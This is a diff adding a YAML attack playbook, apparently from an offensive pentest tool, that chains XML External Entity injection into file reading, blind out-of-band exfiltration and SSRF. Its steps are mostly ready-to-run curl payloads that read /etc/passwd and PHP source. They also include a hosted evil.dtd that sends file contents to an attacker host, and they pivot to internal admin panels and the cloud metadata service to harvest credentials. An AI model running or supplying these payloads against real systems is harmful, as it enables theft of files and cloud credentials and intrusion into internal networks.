@@ -1,0 +1,103 @@
+id: xxe-to-file-read
+name: "Web — XXE → file read → escalate to SSRF/RCE"
+description: >
+  XML External Entity injection: feed the parser an external DTD or
+  entity, exfiltrate files / hit internal endpoints. Java parsers are
+  especially generous with file:// and http:// URI schemes.
+tags: [web, xxe, xml, file-disclosure, ssrf]
+difficulty: medium
+
+inputs:
+  - name: target_url
+    description: "Endpoint that parses XML you control."
+    required: true
+
+steps:
+  - id: baseline
+    name: "Confirm XML is parsed (echo content)"
+    inline_command: |
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/xml' \
+        -d '<?xml version="1.0"?><foo>HELLOWORLD</foo>'
+    inputs:
+      url: "${target_url}"
+    notes: |
+      If `HELLOWORLD` appears anywhere in the response → reflected XML
+      content; XXE viable. If response is fully ignored, try blind XXE
+      via an out-of-band channel (interactsh/Burp Collaborator).
+
+  - id: file_read
+    name: "Read /etc/passwd via external entity"
+    inline_command: |
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/xml' \
+        -d '<?xml version="1.0"?>
+            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+            <foo>&xxe;</foo>'
+    inputs:
+      url: "${target_url}"
+
+  - id: read_app_source
+    name: "Read app source (PHP via base64 wrapper)"
+    inline_command: |
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/xml' \
+        -d '<?xml version="1.0"?>
+            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+            <foo>&xxe;</foo>'
+    inputs:
+      url: "${target_url}"
+    notes: |
+      base64-decode the result to read PHP source — find db creds, more
+      endpoints, secret keys. Same trick works for Java with the `jar://`
+      scheme to read JAR contents.
+
+  - id: blind_xxe_oob
+    name: "Blind XXE — out-of-band exfil via external DTD"
+    inline_command: |
+      # 1) Host this DTD on your attacker box (python3 -m http.server 80):
+      cat > evil.dtd <<'EOF'
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>/?d=%file;'>">
+      %eval;
+      %exfil;
+      EOF
+      # 2) Inject the loader:
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/xml' \
+        -d '<?xml version="1.0"?>
+            <!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://<lhost>/evil.dtd"> %dtd;]>
+            <foo>x</foo>'
+    inputs:
+      url: "${target_url}"
+      lhost: "${attacker_ip}"
+    notes: |
+      Works when the parser blocks direct echo but still resolves remote
+      DTDs. Your web log will show `GET /?d=<base64-passwd>`. Some parsers
+      reject `%file;` interpolation in URL params — use FTP exfil instead
+      (run a small ftpserver.py to grab data via FTP URLs).
+
+  - id: ssrf_pivot
+    name: "Use XXE as SSRF → hit internal services"
+    inline_command: |
+      curl -X POST '<url>' \
+        -d '<?xml version="1.0"?>
+            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-admin.local/users">]>
+            <foo>&xxe;</foo>'
+    inputs:
+      url: "${target_url}"
+    notes: |
+      Same XXE primitive lets you proxy HTTP requests inside the network.
+      Common targets: IMDS (169.254.169.254), Kubernetes API (10.0.0.1),
+      internal admin panels. Pair with aws-imds-ssrf if EC2-hosted.
+
+references:
+  - title: "HackTricks — XXE"
+    url:   "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+  - title: "PayloadsAllTheThings — XXE"
+    url:   "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+
+next_chains:
+  - chain: aws-imds-ssrf
+    when:   'XXE works as SSRF and target is on EC2'
+    reason: 'Pivot through XXE to harvest cloud creds.'
